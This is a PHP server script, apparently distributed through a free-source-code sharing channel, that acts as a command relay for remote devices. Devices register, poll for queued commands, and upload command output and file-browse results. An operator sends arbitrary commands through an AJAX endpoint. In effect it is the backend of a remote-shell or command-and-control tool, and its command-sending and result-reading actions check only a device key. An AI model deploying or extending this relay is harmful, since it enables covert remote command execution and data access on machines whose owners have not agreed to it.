//官网:泽峰.top    更多公益开源资源分享 \n TG@ASDK886 QQ1063167389\n各大源码免费分享 网络搜集 打破信息差    官方频道:https://t.me/+FDfQgP9RFdljYjFl
<?php
require_once 'db.php';

$cmd_dir = __DIR__ . '/devices/';
if (!is_dir($cmd_dir)) mkdir($cmd_dir, 0755, true);

$TIMEOUT = 150;
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';

// 客户端注册/心跳
if ($action === 'register' && isset($_REQUEST['key'])) {
    $device_key = preg_replace('/[^a-zA-Z0-9_-]/', '', $_REQUEST['key']);
    $api_key = isset($_REQUEST['api_key']) ? preg_replace('/[^a-zA-Z0-9]/', '', $_REQUEST['api_key']) : '';
    
    if ($device_key === '') {
        echo 'ERROR:key不能为空';
        exit;
    }
    
    $user = null;
    if (!empty($api_key)) {
        $stmt = $pdo->prepare("SELECT id, username, api_key FROM users WHERE api_key = ?");
        $stmt->execute([$api_key]);
        $user = $stmt->fetch();
    }
    if (!$user) {
        $stmt = $pdo->prepare("SELECT id, username, api_key FROM users WHERE device_key = ?");
        $stmt->execute([$device_key]);
        $user = $stmt->fetch();
    }
    
    if (!$user) {
        echo 'ERROR:无效密钥';
        exit;
    }
    
    $device_file = $cmd_dir . $device_key . '.json';
    $device_data = [
        'device_key' => $device_key,
        'api_key'    => $user['api_key'],
        'user_id'    => $user['id'],
        'username'   => $user['username'],
        'last_seen'  => date('Y-m-d H:i:s'),
        'status'     => 'online'
    ];
    file_put_contents($device_file, json_encode($device_data));
    
    // 清理超时设备
    $all_files = glob($cmd_dir . '*.json');
    foreach ($all_files as $f) {
        $d = json_decode(file_get_contents($f), true);
        if ($d && isset($d['last_seen']) && $d['api_key'] === $user['api_key']) {
            if (time() - strtotime($d['last_seen']) > $TIMEOUT) {
                @unlink($f);
                @unlink($cmd_dir . $d['device_key'] . '_cmd.txt');
                @unlink($cmd_dir . $d['device_key'] . '_result.txt');
            }
        }
    }
    
    $cmd_file = $cmd_dir . $device_key . '_cmd.txt';
    $cmd = file_exists($cmd_file) ? trim(file_get_contents($cmd_file)) : '';

    if ($cmd && (stripos($cmd, '<html') !== false || stripos($cmd, '<!DOCTYPE') !== false)) {
        $cmd = '';
    }

    // 直接返回纯文本命令（有命令就返回命令，没有就返回空行）
    if (!empty($cmd)) {
        echo $cmd;
    } else {
        echo "\n";
    }
    exit;
}

// 上报结果
if ($action === 'result' && isset($_REQUEST['key'])) {
    $device_key = preg_replace('/[^a-zA-Z0-9_-]/', '', $_REQUEST['key']);
    $result_file = $cmd_dir . $device_key . '_result.txt';
    
    $cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : '';
    $output = isset($_REQUEST['output']) ? $_REQUEST['output'] : '';
    $exit_code = isset($_REQUEST['exit_code']) ? $_REQUEST['exit_code'] : '';
    
    $is_file_browse = (strpos($cmd, 'FILE_START') !== false);
    
    file_put_contents($result_file, json_encode([
        'time'      => date('Y-m-d H:i:s'),
        'cmd'       => $cmd,
        'output'    => $output,
        'exit_code' => $exit_code,
        'is_file_browse' => $is_file_browse
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
    
    echo 'OK';
    exit;
}

// 清除命令
if ($action === 'clear_cmd' && isset($_REQUEST['key'])) {
    $device_key = preg_replace('/[^a-zA-Z0-9_-]/', '', $_REQUEST['key']);
    $cmd_file = $cmd_dir . $device_key . '_cmd.txt';
    if (file_exists($cmd_file)) {
        file_put_contents($cmd_file, '');
    }
    echo 'OK';
    exit;
}

// 查询结果（用于AJAX轮询）
if ($action === 'poll_result' && isset($_REQUEST['key'])) {
    $device_key = preg_replace('/[^a-zA-Z0-9_-]/', '', $_REQUEST['key']);
    $result_file = $cmd_dir . $device_key . '_result.txt';
    
    if (file_exists($result_file)) {
        $content = @file_get_contents($result_file);
        if ($content !== false && !empty($content)) {
            $result = json_decode($content, true);
            if ($result) {
                // 支持增量获取 - 如果有last_poll_time，只返回新结果
                $last_poll = isset($_REQUEST['last_poll']) ? intval($_REQUEST['last_poll']) : 0;
                $result_time = strtotime($result['time'] ?? 'now');
                
                // 如果上次轮询时间早于结果时间，说明有新结果
                if ($result_time > $last_poll) {
                    echo json_encode([
                        'has_result' => true,
                        'result' => $result
                    ], JSON_UNESCAPED_UNICODE);
                } else {
                    echo json_encode(['has_result' => false]);
                }
                exit;
            }
        }
    }
    echo json_encode(['has_result' => false]);
    exit;
}

// 发送命令（新增接口，支持AJAX发送命令）
if ($action === 'send_cmd' && isset($_REQUEST['key']) && isset($_REQUEST['cmd'])) {
    $device_key = preg_replace('/[^a-zA-Z0-9_-]/', '', $_REQUEST['key']);
    $cmd = $_REQUEST['cmd'];
    
    // 安全性检查
    if (empty($cmd) || strlen($cmd) > 10000) {
        echo json_encode(['success' => false, 'error' => '命令无效或过长']);
        exit;
    }
    
    $cmd_file = $cmd_dir . $device_key . '_cmd.txt';
    $result_file = $cmd_dir . $device_key . '_result.txt';
    
    // 清除旧结果
    if (file_exists($result_file)) {
        @unlink($result_file);
    }
    
    // 写入命令
    if (@file_put_contents($cmd_file, $cmd) !== false) {
        echo json_encode(['success' => true, 'time' => time()]);
    } else {
        echo json_encode(['success' => false, 'error' => '命令写入失败']);
    }
    exit;
}

echo 'ERROR:无效请求';